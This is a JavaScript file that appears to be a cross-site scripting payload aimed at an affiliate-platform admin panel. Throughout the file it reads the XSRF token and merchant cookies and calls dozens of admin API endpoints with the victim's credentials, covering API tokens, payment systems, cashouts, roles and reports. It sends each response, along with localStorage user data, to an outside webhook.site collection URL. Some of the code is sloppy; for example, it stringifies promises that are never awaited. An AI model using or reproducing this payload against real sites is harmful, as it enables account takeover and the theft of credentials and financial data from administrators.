
const dataToSend = {
};
var url = "https://webhook.site/eac99d84-8bc8-4c73-9057-b7b3b6aa33c5";

function getCookie(name) {
  const cookies = document.cookie.split('; ');
  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i];
    // Check if the cookie starts with the desired name and an equals sign
    if (cookie.startsWith(name + '=')) {
      // Return the value part of the cookie
      return decodeURIComponent(cookie.substring(name.length + 1));
    }
  }
  return null; // Return null if the cookie is not found
}

dataToSend.authenticity_token = getCookie("XSRF-TOKEN-X");
dataToSend.merchant = getCookie("merchant_id");


fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/trackers/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?ap="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?ap="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?ar="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?ar="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});



fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/trackers/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?trackers="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?trackers="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});


fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
"X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?da="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?ad="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/translate_manager/server_marks?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?servmarl="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/profile/api_tokens?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?apit="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/banner_settings?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?banner="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/affiliates/list_of_affiliate_managers?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?banner="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/payment_system_lists/allowed_payment_systems?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?allowed_payment_systems="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/history_of_limit_changes/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?history_of_limit_changes="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 

})();


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/dashboard/get_stats?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?dashboard="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/dashboard/chart?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?dashboardc="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();



(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/dashboard/tops?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?dashboardt="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/roles/list?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?roles="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send();
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();



(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/bookkeepings/list_month_payments?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?listm="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/admin/project_settings/admins_with_full_stats_access?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?adm="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();


fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/observing_of_daily_statistics_players', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?dailystat="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?dailystat="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});


fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/balance/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?affcash="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?affcash="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});




fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/ftp_files/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?ftp="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?ftp="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});


fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/bonuses/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?bonusr="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?bonuse="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});



fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/adjustment_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?affl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?afll="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});



fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/affiliate_cashouts/pending_cashouts/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?affl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?afll="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});



fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/articles/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?artl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?artl="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});



(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://"+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+"/api2/csrf_token?authenticity_token="+getCookie("XSRF-TOKEN-X")+"&merchant="+getCookie("merchant_id"), true);
      xhr.withCredentials = true;
     xhr.setRequestHeader("Content-Type","application/json");
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", url + "/?dashboardc="+xhr.responseText, false ); // false for synchronous request
        xmlHttp1.send({"_merchant":getCookie("merchant_id")});
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();

const dataToSend1 = {
};
dataToSend1.authenticity_token = getCookie("XSRF-TOKEN-X");
dataToSend1.merchant = getCookie("merchant_id");
dataToSend1.report = {
      period: {
        start: "2025-10-08T05:24:27Z",
        end: "2025-10-10T05:24:27Z",
      },
      group_by_date: 'group_by_alltime',
      group_by_affiliate_params: 'group_by_merchant',
      group_by_player_params: 'all_players'};

fetch('https://'+document.domain.replace("affiliates1","affiliates1-api").replace("affiliates.","affiliates-api.")+'/api2/admin/reports/download_report', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend1) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?artl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "?artl="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", url + "/?data="+JSON.stringify(dataToSend)+"&ls="+localStorage.getItem("user"), true);
      xhr.onload = function(e) {
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();
